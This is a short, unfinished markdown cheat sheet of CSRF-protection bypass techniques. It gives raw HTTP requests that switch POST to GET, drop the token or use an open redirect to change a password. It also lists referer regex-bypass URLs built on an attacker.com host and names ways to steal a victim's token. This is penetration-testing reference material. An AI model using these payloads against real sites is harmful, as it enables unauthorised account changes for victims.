# CSRF Bypass

Work in progress ...

## Token-Based

#### 1) Change HTTP method 

```
POST /setting/ HTTP/1.1
Host: www.example.com

password=azerty&token=x

------------------------

HTTP/1.1 403 Forbidden
```

```
GET /setting/?password=azerty&token=x
Host: www.example.com

------------------------

HTTP/1.1 200 OK
```

#### 2) Delete token parameter

```
GET /setting/?password=azerty
Host: www.example.com
```

#### 3) Send token from a other account

#### 4) Steal victim's token with

   1. XSS
   2. CORS Misconfiguration
   3. JSON Hijacking
   4. Information disclosure


## Referer-Based


#### 1) Delete the referer

#### 2) Regex bypass

```
https://vuln.co
https://attacker.com?https://vuln.com/
https://vuln.com.attacker.com/
https://attackervuln.com/
https://vuln.com@fuzzme.org//
```

#### 3) Open redirect 

```
GET /?redirect=https://example.com/setting/?password=azerty
Host: www.example.com
Referer: https://www.example.com/
```

#### 4) Change HTTP method
